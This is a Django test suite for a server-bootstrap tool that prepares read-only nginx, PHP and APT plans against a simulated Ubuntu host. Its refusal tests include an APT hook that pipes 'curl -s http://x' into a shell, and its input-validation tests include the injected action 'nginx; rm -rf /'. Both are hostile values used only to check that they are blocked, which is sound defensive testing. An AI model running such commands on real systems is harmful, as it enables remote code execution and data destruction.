"""The request-to-worker-to-plan-to-rendered-review workflow for plan preparation.

Real views, services, the lifecycle, the ``db_worker`` command, persistence and rendering
run; only remote execution is substituted, with a simulated Ubuntu 24.04 server answering
at ``discovery.ssh.connect``.
"""

from datetime import timedelta
from typing import override
from unittest import mock

from django.contrib.auth.models import Permission
from django.db.models import Model
from django.test import Client
from django.utils import timezone

from discovery.fakes import HOST_KEY, STALE, record_attempt
from discovery.models import DiscoveryAttempt
from discovery.services import request_discovery
from discovery.ssh import CommandResult
from operations.models import RemoteOperation
from servers.testing import HTMX_FRAGMENT

from . import inspection
from .fakes import (
    BOOT_ID,
    NGINX_VERSION,
    PHP_VERSION,
    PLAN_PERMISSIONS,
    UPTIME_CENTISECONDS,
    WILDCARDS,
    PreparationTestCase,
)
from .models import (
    ADMISSION_CENTISECONDS,
    ConfigurationPlan,
    PackageTransition,
    PlanEffect,
    PlanEvidence,
    PlanPreparation,
    PlanRefusal,
    PlanRootPackage,
    Privilege,
)
from .services import INTERRUPTED_FAILURE, REVOKED_FAILURE

Reason = PlanRefusal.Reason
Effect = PlanEffect.Kind
Status = RemoteOperation.Status


def kept_text(plan: ConfigurationPlan) -> str:
    """Every value stored for a plan, as text: what could ever be shown."""
    rows: list[Model] = [
        plan,
        *plan.roots.all(),
        *plan.transitions.all(),
        *plan.effects.all(),
        *plan.postconditions.all(),
        *plan.refusals.all(),
        *plan.evidence.all(),
    ]
    return "\n".join(
        str(getattr(row, field.attname)) for row in rows for field in row._meta.concrete_fields
    )


class PreparationWorkflowTests(PreparationTestCase):
    def test_a_request_queues_work_that_the_worker_turns_into_a_reviewed_plan(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.noble.answer(self.remote)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}
        )
        self.assertRedirects(response, f"/servers/{self.server.pk}/#plans")
        preparation = PlanPreparation.objects.get()
        # The request only queued the work; nothing connected during it.
        self.assertEqual(preparation.status, Status.QUEUED)
        self.assertEqual(preparation.kind, RemoteOperation.Kind.PLAN_PREPARATION)
        self.assertEqual(preparation.requested_by, self.user)
        self.assertEqual(self.remote.targets, [])
        page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertContains(page, "Preparation queued")
        self.assertContains(page, 'hx-trigger="every 2s"')

        self.run_worker()

        preparation.refresh_from_db()
        self.assertEqual(preparation.status, Status.SUCCEEDED)
        self.assertEqual(preparation.host_key, HOST_KEY)
        plan = ConfigurationPlan.objects.get()
        self.assertTrue(plan.eligible)
        self.assertFalse(plan.no_changes)
        self.assertEqual(
            (plan.action, plan.ssh_alias, plan.host_key, plan.boot_id, plan.privilege),
            ("nginx", "web.example.com", HOST_KEY, BOOT_ID, Privilege.SUDO),
        )
        self.assertEqual(plan.uptime_centiseconds, UPTIME_CENTISECONDS)
        self.assertEqual(
            plan.admission_deadline_centiseconds, UPTIME_CENTISECONDS + ADMISSION_CENTISECONDS
        )
        self.assertEqual(plan.admission_expires_at - plan.collected_at, timedelta(minutes=15))
        self.assertEqual(
            (plan.os_name, plan.architecture, plan.apt_version),
            ("Ubuntu 24.04.5 LTS", "amd64", "2.8.3"),
        )
        self.assertEqual(
            list(plan.roots.values_list("name", "version", "installed")),
            [("nginx", NGINX_VERSION, False)],
        )
        installs = plan.transitions.filter(step=PackageTransition.Step.INSTALL)
        self.assertEqual(
            list(installs.values_list("package", "version", "architecture")),
            [
                ("libelf1t64", "0.190-1.1ubuntu0.1", "amd64"),
                ("libbpf1", "1:1.3.0-2build2", "amd64"),
                ("iproute2", "6.1.0-1ubuntu6.4", "amd64"),
                ("nginx-common", NGINX_VERSION, "all"),
                ("nginx", NGINX_VERSION, "amd64"),
            ],
        )
        self.assertEqual(plan.transitions.filter(step="configure").count(), 5)
        self.assertEqual(
            installs.get(package="nginx").origins,
            "Ubuntu:24.04/noble-updates\nUbuntu:24.04/noble-security",
        )
        self.assertEqual(
            list(plan.effects.values_list("kind", flat=True)),
            [
                Effect.PACKAGES,
                Effect.PACKAGE_GUARD,
                Effect.MAINTAINER_START,
                Effect.HTTP_LISTENER,
                Effect.NEEDRESTART,
                Effect.NO_ROLLBACK,
            ],
        )
        self.assertIn("nginx -t accepts the configuration.", kept_text(plan))
        kinds = set(plan.evidence.values_list("kind", flat=True))
        # Every kind of evidence except the retained units only a cleanup reads.
        self.assertEqual(kinds, set(PlanEvidence.Kind.values) - {PlanEvidence.Kind.RETAINED_UNITS})
        self.assertFalse(plan.refusals.exists())

        page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertContains(page, "Ready for review")
        self.assertContains(page, "Latest plan: Nginx profile")
        self.assertContains(page, f"<code>{BOOT_ID}</code>", html=True)
        self.assertContains(page, "port 80 on every IPv4 and IPv6 address")
        self.assertContains(page, "maintainer scripts enable and start nginx.service")
        self.assertContains(page, "Barectl does not roll back")
        self.assertContains(page, "15 minutes after collection on the server's monotonic clock")
        self.assertContains(page, "<code>1:1.3.0-2build2</code>", html=True)
        self.assertNotContains(page, 'hx-trigger="every 2s"')
        # No control can apply a plan in this release.
        self.assertNotContains(page, ">Apply")
        plan_page = self.client.get(f"/plans/{preparation.pk}/")
        self.assertContains(plan_page, "Nginx profile plan")
        self.assertContains(plan_page, "Every check passed")

    def test_preparation_only_reads_and_never_escalates_beyond_its_listed_reads(self) -> None:
        self.plan("nginx")
        self.assertTrue(self.remote.commands)
        # Every test checks each command against PREPARATION_READ_ONLY; these never run.
        for command in self.remote.commands:
            self.assertNotIn("apt-get update", command)
            self.assertNotRegex(command, r"apt-get (?!-s|indextargets)")
            self.assertNotRegex(command, r"systemctl (?!show )")
            if command.startswith("sudo "):
                self.assertRegex(command, r"\Asudo -n (-l |/usr/bin/ss -Hltnp )")

    def test_plans_keep_no_configuration_output_or_credentials(self) -> None:
        plan = self.plan("nginx")
        kept = kept_text(plan)
        # The fake's APT configuration includes a proxy password.
        self.assertNotIn("hunter2", kept)
        self.assertNotIn("proxyuser", kept)
        self.assertNotIn("dpkg-preconfigure", kept)
        page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertNotContains(page, "hunter2")

    def test_a_satisfied_profile_is_a_plan_without_changes(self) -> None:
        self.noble.nginx = "installed"
        plan = self.plan("nginx")
        self.assertTrue(plan.eligible)
        self.assertTrue(plan.no_changes)
        self.assertEqual(
            list(plan.roots.values_list("name", "version", "installed")),
            [("nginx", NGINX_VERSION, True)],
        )
        self.assertFalse(plan.transitions.exists())
        self.assertEqual(list(plan.effects.values_list("kind", flat=True)), [Effect.NO_CHANGES])
        # Newer archive versions are never considered: nothing simulates an installation.
        self.assertFalse(any("apt-get -s" in command for command in self.remote.commands))
        self.assertContains(self.client.get(f"/servers/{self.server.pk}/"), "No changes needed")

    def test_a_stopped_disabled_profile_proposes_explicit_enable_and_start(self) -> None:
        self.noble.php = "installed"
        self.noble.php_active = "inactive"
        self.noble.php_enabled = "disabled"
        plan = self.plan("php8.3")
        self.assertTrue(plan.eligible)
        self.assertFalse(plan.no_changes)
        self.assertFalse(plan.transitions.exists())
        self.assertEqual(
            list(plan.effects.values_list("kind", flat=True)),
            [Effect.SERVICE_ENABLE, Effect.SERVICE_START, Effect.LOCAL_SOCKET],
        )
        self.assertIn("php8.3-fpm.service is enabled and active.", kept_text(plan))

    def test_php_is_prepared_independently_of_nginx(self) -> None:
        plan = self.plan("php8.3")
        self.assertTrue(plan.eligible, self.reasons(plan))
        self.assertEqual(
            list(plan.roots.values_list("name", "version", "installed")),
            [("php8.3-fpm", PHP_VERSION, False), ("php8.3-cli", PHP_VERSION, False)],
        )
        self.assertIn("opens no network port", kept_text(plan))
        self.assertFalse(any("nginx" in command for command in self.remote.commands))

    def test_a_metadata_refresh_plan_has_its_own_evidence_and_no_transitions(self) -> None:
        plan = self.plan("metadata_refresh")
        self.assertTrue(plan.eligible)
        self.assertFalse(plan.roots.exists())
        self.assertFalse(plan.transitions.exists())
        self.assertEqual(
            list(plan.effects.values_list("kind", flat=True)),
            [
                Effect.INDEX_UPDATE,
                Effect.UPDATE_HOOKS,
                Effect.INVALIDATES_PLANS,
                Effect.NO_ROLLBACK,
            ],
        )
        self.assertEqual(
            set(plan.evidence.values_list("kind", flat=True)),
            {
                PlanEvidence.Kind.PLATFORM,
                PlanEvidence.Kind.PRIVILEGE,
                PlanEvidence.Kind.APT_CONFIGURATION,
                PlanEvidence.Kind.APT_HOOKS,
                PlanEvidence.Kind.APT_SOURCES,
                PlanEvidence.Kind.APT_PREFERENCES,
                PlanEvidence.Kind.PACKAGE_INDEXES,
                PlanEvidence.Kind.APT_REVALIDATION,
            },
        )
        # The digest the apply payload recomputes on the server is kept as read.
        self.assertEqual(
            plan.evidence.get(kind=PlanEvidence.Kind.APT_REVALIDATION).fingerprint,
            self.noble.apt_digest(),
        )
        text = kept_text(plan)
        self.assertIn("http://archive.ubuntu.com/ubuntu", text)
        self.assertIn("command-not-found rebuilds the command-not-found database", text)
        # Preview never refreshes metadata, and a refresh plan reads no package states.
        self.assertFalse(
            any("dpkg-query -W -f='${Package}\\t${Arch" in c for c in self.remote.commands)
        )

    def test_unsupported_or_unsafe_evidence_is_refused_with_reasons(self) -> None:
        masked = (
            "Id=nginx.service\nLoadState=masked\nActiveState=inactive\nSubState=dead\n"
            "FragmentPath=/etc/systemd/system/nginx.service\nDropInPaths=\nUnitFileState=masked\n"
        )
        removal = (
            "0 upgraded, 1 newly installed, 1 to remove and 0 not upgraded.\n"
            "Remv apache2 [2.4.58-1ubuntu8.8]\n"
            f"Inst nginx ({NGINX_VERSION} Ubuntu:24.04/noble-updates [amd64])\n"
            f"Conf nginx ({NGINX_VERSION} Ubuntu:24.04/noble-updates [amd64])\n"
        )
        cases: list[tuple[str, str, dict[str, object], PlanRefusal.Reason]] = [
            (
                "upgrade",
                "nginx",
                {"upgrades": (("libc6", "2.39-0ubuntu8.3", "2.39-0ubuntu8.4"),)},
                Reason.INSTALLED_PACKAGE_CHANGE,
            ),
            ("removal", "nginx", {"simulation_text": removal}, Reason.INSTALLED_PACKAGE_CHANGE),
            ("hold", "nginx", {"holds": ("nginx-common",)}, Reason.HELD_PACKAGE),
            (
                "unknown hook",
                "nginx",
                {"hooks": [("DPkg::Post-Invoke::", "curl -s http://x | sh")]},
                Reason.APT_HOOK,
            ),
            (
                "unknown hook",
                "metadata_refresh",
                {"hooks": [("APT::Update::Post-Invoke::", "touch /tmp/x")]},
                Reason.APT_HOOK,
            ),
            (
                "other archive",
                "nginx",
                {"nginx_origins": "LP-PPA-ondrej-nginx:24.04/noble"},
                Reason.PACKAGE_SOURCE,
            ),
            (
                "trusted source",
                "metadata_refresh",
                {"source_overrides": ("/etc/apt/sources.list.d/extra.list",)},
                Reason.PACKAGE_SOURCE,
            ),
            ("missing index", "nginx", {"suites": ("noble",)}, Reason.PACKAGE_METADATA),
            ("unauthenticated index", "php8.3", {"trusted": False}, Reason.PACKAGE_METADATA),
            (
                "pending dpkg",
                "nginx",
                {"audit": "The following packages are only half configured"},
                Reason.PACKAGE_HEALTH,
            ),
            ("leftover", "nginx", {"nginx": "leftover"}, Reason.LEFTOVER),
            (
                "extra site",
                "nginx",
                {
                    "nginx": "installed",
                    "extra_files": {"/etc/nginx/sites-available/shop": "1" * 32},
                },
                Reason.CUSTOMIZED,
            ),
            (
                "changed conffile",
                "nginx",
                {"nginx": "installed", "changed_conffiles": ("/etc/nginx/nginx.conf",)},
                Reason.CUSTOMIZED,
            ),
            (
                "extra pool",
                "php8.3",
                {
                    "php": "installed",
                    "extra_files": {"/etc/php/8.3/fpm/pool.d/shop.conf": "2" * 32},
                },
                Reason.CUSTOMIZED,
            ),
            (
                "unit override",
                "nginx",
                {
                    "nginx": "installed",
                    "unit_drop_ins": "/etc/systemd/system/nginx.service.d/override.conf",
                },
                Reason.SERVICE_UNIT,
            ),
            (
                "failed unit",
                "php8.3",
                {"php": "installed", "php_active": "failed"},
                Reason.SERVICE_UNIT,
            ),
            (
                "masked unit",
                "nginx",
                {"extra": {inspection.unit_state("nginx.service"): CommandResult(0, masked)}},
                Reason.SERVICE_UNIT,
            ),
            ("listener", "nginx", {"other_listeners": WILDCARDS[:1]}, Reason.LISTENER),
            ("privilege", "nginx", {"privilege": "none"}, Reason.PRIVILEGE),
            ("malformed", "nginx", {"simulation_text": "Inst nginx (garbage\n"}, Reason.INCOMPLETE),
            (
                "truncated",
                "nginx",
                {"extra": {inspection.APT_CONFIG: CommandResult(0, "", truncated=True)}},
                Reason.INCOMPLETE,
            ),
            (
                "denied",
                "php8.3",
                {"extra": {inspection.DPKG_AUDIT: CommandResult(126, "")}},
                Reason.INCOMPLETE,
            ),
            (
                "platform",
                "nginx",
                {
                    "extra": {
                        inspection.OS_RELEASE: CommandResult(0, 'ID=debian\nVERSION_ID="12"\n')
                    }
                },
                Reason.UNSUPPORTED_PLATFORM,
            ),
        ]
        for name, action, changes, reason in cases:
            with self.subTest(case=name, action=action):
                self.fresh_server()
                for attribute, value in changes.items():
                    setattr(self.noble, attribute, value)
                plan = self.plan(action)
                self.assertFalse(plan.eligible)
                self.assertIn(reason, self.reasons(plan))
                self.assertFalse(plan.effects.exists())
                self.assertFalse(plan.postconditions.exists())
                page = self.client.get(f"/servers/{self.server.pk}/")
                self.assertContains(page, "Refused: this plan cannot be applied")
                self.assertContains(page, PlanRefusal.Reason(reason).label)
                self.assertContains(page, "Barectl changed nothing on the server")

    def test_customized_configuration_is_named_without_its_contents(self) -> None:
        self.noble.nginx = "installed"
        self.noble.extra_files = {"/etc/nginx/sites-available/shop": "1" * 32}
        plan = self.plan("nginx")
        (refusal,) = plan.refusals.all()
        self.assertEqual(refusal.reason, Reason.CUSTOMIZED)
        self.assertIn(
            "/etc/nginx/sites-available/shop (not part of the distribution's", refusal.text
        )
        self.assertIn("Bootstrap does not adopt or overwrite custom configuration.", refusal.text)

    def test_a_connection_failure_fails_the_preparation_without_a_plan(self) -> None:
        self.remote.failure = "The controller host does not trust the host key presented."
        preparation = self.prepare("nginx")
        self.assertEqual(preparation.status, Status.FAILED)
        self.assertIn("does not trust the host key", preparation.failure)
        self.assertFalse(ConfigurationPlan.objects.exists())
        page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertContains(page, "Preparation failed")
        self.assertContains(page, "does not trust the host key")

    def test_the_account_is_revalidated_before_the_worker_connects(self) -> None:
        user = type(self.user)

        def remove_permission() -> None:
            self.user.user_permissions.remove(
                Permission.objects.get(codename="prepare_configurationplan")
            )

        def deactivate() -> None:
            user.objects.filter(pk=self.user.pk).update(is_active=False)

        revocations = {"permission": remove_permission, "deactivation": deactivate}
        for name, revoke in revocations.items():
            with self.subTest(revocation=name):
                self.fresh_server()
                user.objects.filter(pk=self.user.pk).update(is_active=True)
                self.sign_in_with(*PLAN_PERMISSIONS)
                self.noble.answer(self.remote)
                self.remote.targets.clear()
                self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
                revoke()
                self.run_worker()
                preparation = PlanPreparation.objects.get()
                self.assertEqual(preparation.status, Status.FAILED)
                self.assertEqual(preparation.failure, REVOKED_FAILURE)
                self.assertEqual(self.remote.targets, [])

    def test_plans_are_immutable(self) -> None:
        plan = self.plan("nginx")
        with self.assertRaises(ValueError):
            plan.save()
        root = plan.roots.get()
        root.version = "9.9"
        with self.assertRaises(ValueError):
            root.save()
        with self.assertRaises(ValueError):
            PlanRootPackage(plan=plan, name="x", version="1", installed=False).save(
                force_update=True
            )

    def test_an_expired_plan_asks_for_a_new_preparation(self) -> None:
        plan = self.plan("nginx")
        later = plan.admission_expires_at + timedelta(seconds=1)
        with mock.patch("bootstrap.presentation.timezone.now", return_value=later):
            page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertContains(page, "admission deadline has passed")
        self.assertContains(page, "(expired)")
        self.assertNotContains(page, "Every check passed")

    def test_a_plan_keeps_the_alias_it_was_prepared_with(self) -> None:
        first = self.plan("nginx")
        self.sign_in_with("view_server", "change_server")
        self.client.post(
            f"/servers/{self.server.pk}/edit/", {"name": "Web", "ssh_alias": "stage.example.net"}
        )
        self.run_worker()
        second = self.plan("nginx")
        self.assertEqual(first.ssh_alias, "web.example.com")
        self.assertEqual(second.ssh_alias, "stage.example.net")
        self.assertEqual(
            [target.alias for target in self.remote.targets],
            ["web.example.com", "stage.example.net", "stage.example.net"],
        )
        page = self.client.get(f"/plans/{first.pk}/")
        self.assertContains(page, "<code>web.example.com</code>", html=True)

    def test_the_alias_cannot_change_while_a_preparation_is_active(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS, "change_server")
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        response = self.client.post(
            f"/servers/{self.server.pk}/edit/", {"name": "Web", "ssh_alias": "stage.example.net"}
        )
        self.assertContains(response, "Change it after the operation finishes.")
        self.server.refresh_from_db()
        self.assertEqual(self.server.ssh_alias, "web.example.com")

    def test_an_abandoned_preparation_is_recovered_as_interrupted(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        preparation = record_attempt(PlanPreparation.objects.get(), Status.RUNNING, age=STALE)
        page = self.client.get(f"/servers/{self.server.pk}/")
        preparation.refresh_from_db()
        self.assertEqual(preparation.status, Status.FAILED)
        self.assertEqual(preparation.failure, INTERRUPTED_FAILURE)
        self.assertContains(page, "Preparation failed")
        self.assertContains(page, "Prepare plan")

    def test_removal_deletes_plans_and_waits_for_an_active_preparation(self) -> None:
        self.plan("nginx")
        self.sign_in_with(*PLAN_PERMISSIONS, "delete_server")
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "php8.3"})
        page = self.client.get(f"/servers/{self.server.pk}/remove/")
        self.assertContains(page, "Remote operation in progress")
        refused = self.client.post(f"/servers/{self.server.pk}/remove/", {"confirm": "remove"})
        self.assertEqual(refused.status_code, 409)
        self.run_worker()
        page = self.client.get(f"/servers/{self.server.pk}/remove/")
        self.assertContains(page, "2 plan preparations with their plans")
        self.client.post(f"/servers/{self.server.pk}/remove/", {"confirm": "remove"})
        self.assertFalse(RemoteOperation.objects.exists())
        self.assertFalse(ConfigurationPlan.objects.exists())


class ActiveOperationTests(PreparationTestCase):
    """Discovery and plan preparation share one active remote operation per server."""

    def test_a_connection_check_blocks_preparation(self) -> None:
        request_discovery(self.server)
        self.sign_in_with(*PLAN_PERMISSIONS)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}, follow=True
        )
        self.assertContains(response, "Barectl is running another remote operation")
        self.assertFalse(PlanPreparation.objects.exists())
        page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertNotContains(page, "Prepare plan")
        self.assertContains(page, "such as a connection check. A plan can be prepared after")
        self.run_worker()
        self.assertContains(self.client.get(f"/servers/{self.server.pk}/"), "Prepare plan")

    def test_a_preparation_blocks_a_connection_check(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS, "add_discoveryattempt")
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        self.client.post(f"/servers/{self.server.pk}/verify/")
        self.assertFalse(DiscoveryAttempt.objects.exists())
        page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertContains(page, "Barectl is running another remote operation for this server.")
        self.assertNotContains(page, "Verify connection</button>")
        # Both sections poll until the operation finishes.
        self.assertContains(page, 'hx-trigger="every 2s"', count=2)
        self.noble.answer(self.remote)
        self.run_worker()
        page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertContains(page, "Verify connection</button>")
        self.assertNotContains(page, 'hx-trigger="every 2s"')

    def test_a_reconciling_operation_occupies_the_active_slot(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        RemoteOperation.objects.update(status=Status.RECONCILING)
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "php8.3"})
        self.assertEqual(PlanPreparation.objects.count(), 1)
        self.assertEqual(request_discovery(self.server).status, Status.RECONCILING)
        # Recovery never fails a reconciling operation, however old.
        RemoteOperation.objects.update(started_at=timezone.now() - STALE)
        self.client.get(f"/servers/{self.server.pk}/")
        self.assertEqual(RemoteOperation.objects.get().status, Status.RECONCILING)


class PlanAccessTests(PreparationTestCase):
    @override
    def setUp(self) -> None:
        super().setUp()
        self.preparation = self.prepare("nginx")
        self.client.logout()
        self.user.user_permissions.clear()

    def test_signed_out_requests_are_sent_to_sign_in(self) -> None:
        for url in (
            f"/servers/{self.server.pk}/plans/",
            f"/plans/{self.preparation.pk}/",
        ):
            with self.subTest(url=url):
                response = self.client.get(url)
                self.assertRedirects(response, f"/accounts/login/?next={url}")
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(PlanPreparation.objects.count(), 1)

    def test_inventory_access_alone_never_shows_plans_or_their_audit(self) -> None:
        record_attempt(self.server, Status.SUCCEEDED)
        self.sign_in_with("view_server", "add_discoveryattempt", "delete_server")
        page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertEqual(page.status_code, 200)
        self.assertNotContains(page, "Bootstrap plans")
        self.assertNotContains(page, BOOT_ID)
        for url in (f"/servers/{self.server.pk}/plans/", f"/plans/{self.preparation.pk}/"):
            with self.subTest(url=url):
                self.assertEqual(self.client.get(url, headers=HTMX_FRAGMENT).status_code, 403)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}
        )
        self.assertEqual(response.status_code, 403)
        activity = self.client.get("/activity/")
        self.assertContains(activity, "Discovery attempts across all servers")
        self.assertNotContains(activity, "Plan preparation")
        self.assertNotContains(activity, "Review plan")
        removal = self.client.get(f"/servers/{self.server.pk}/remove/")
        self.assertNotContains(removal, "plan preparation")

    def test_reviewers_see_plans_but_cannot_prepare_them(self) -> None:
        self.sign_in_with("view_server", "view_configurationplan", "apply_configurationplan")
        page = self.client.get(f"/servers/{self.server.pk}/")
        self.assertContains(page, "Bootstrap plans")
        self.assertContains(page, "Ready for review")
        self.assertNotContains(page, "Prepare plan")
        # Apply stays unavailable in this release, whatever the account may do.
        self.assertNotContains(page, ">Apply")
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}
        )
        self.assertEqual(response.status_code, 403)
        self.assertEqual(PlanPreparation.objects.count(), 1)

    def test_preparation_requires_csrf_and_post(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.assertEqual(
            self.client.get(f"/servers/{self.server.pk}/plans/prepare/").status_code, 405
        )
        checked = Client(enforce_csrf_checks=True)
        checked.force_login(self.user)
        response = checked.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        self.assertEqual(response.status_code, 403)
        self.assertEqual(PlanPreparation.objects.count(), 1)

    def test_only_supported_actions_can_be_prepared(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        for value in ("", "apache2", "nginx; rm -rf /", "apply"):
            with self.subTest(action=value):
                response = self.client.post(
                    f"/servers/{self.server.pk}/plans/prepare/",
                    {"action": value},
                    headers=HTMX_FRAGMENT,
                )
                self.assertEqual(response.status_code, 422)
                self.assertContains(response, "usa-error-message", status_code=422)
                self.assertEqual(PlanPreparation.objects.count(), 1)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "apache2"}, follow=True
        )
        self.assertContains(response, "Choose one of the supported profiles or actions.")

    def test_unknown_servers_and_plans_are_not_found(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.assertEqual(self.client.get("/plans/999/").status_code, 404)
        response = self.client.post("/servers/999/plans/prepare/", {"action": "nginx"})
        self.assertEqual(response.status_code, 404)


class PlanFragmentTests(PreparationTestCase):
    def test_htmx_preparation_returns_a_polling_fragment_and_announces_changes(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.noble.answer(self.remote)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}, headers=HTMX_FRAGMENT
        )
        content = response.content.decode()
        self.assertIn('id="plans"', content)
        self.assertIn('hx-trigger="every 2s"', content)
        # The removed form cannot keep focus; the section heading takes it.
        self.assertIn('id="plans-heading" tabindex="-1" autofocus', content)
        self.assertIn('hx-target="#plans-announcement"', content)
        self.assertIn("Plan preparation queued.", content)
        self.assertNotIn("<html", content)
        token = content.split("?shown=")[1].split('"')[0]
        unchanged = self.client.get(
            f"/servers/{self.server.pk}/plans/?shown={token}", headers=HTMX_FRAGMENT
        )
        self.assertNotContains(unchanged, "plans-announcement")
        self.run_worker()
        ready = self.client.get(
            f"/servers/{self.server.pk}/plans/?shown={token}", headers=HTMX_FRAGMENT
        )
        self.assertContains(ready, "The plan is ready for review.")
        self.assertNotContains(ready, 'hx-trigger="every 2s"')
        self.assertNotContains(ready, "autofocus")

    def test_full_page_requests_for_the_fragment_go_to_the_server_page(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        response = self.client.get(f"/servers/{self.server.pk}/plans/")
        self.assertRedirects(response, f"/servers/{self.server.pk}/")


class PlanActivityTests(PreparationTestCase):
    def test_activity_lists_preparations_beside_attempts_for_plan_reviewers(self) -> None:
        record_attempt(self.server, Status.SUCCEEDED, age=timedelta(minutes=5))
        preparation = self.prepare("nginx")
        self.noble.privilege = "none"
        refused = self.prepare("php8.3")
        page = self.client.get("/activity/")
        self.assertContains(
            page,
            "Discovery attempts, plan preparations and apply runs across all servers, newest first",
        )
        content = page.content.decode()
        php_row = content.index("Plan preparation: PHP 8.3 profile")
        nginx_row = content.index("Plan preparation: Nginx profile")
        check_row = content.index("Connection check")
        self.assertLess(php_row, nginx_row)
        self.assertLess(nginx_row, check_row)
        self.assertContains(page, f'href="/plans/{preparation.pk}/"')
        self.assertContains(page, f'href="/plans/{refused.pk}/"')
        self.assertContains(page, "Refused")
        self.assertContains(page, "Ready for review")
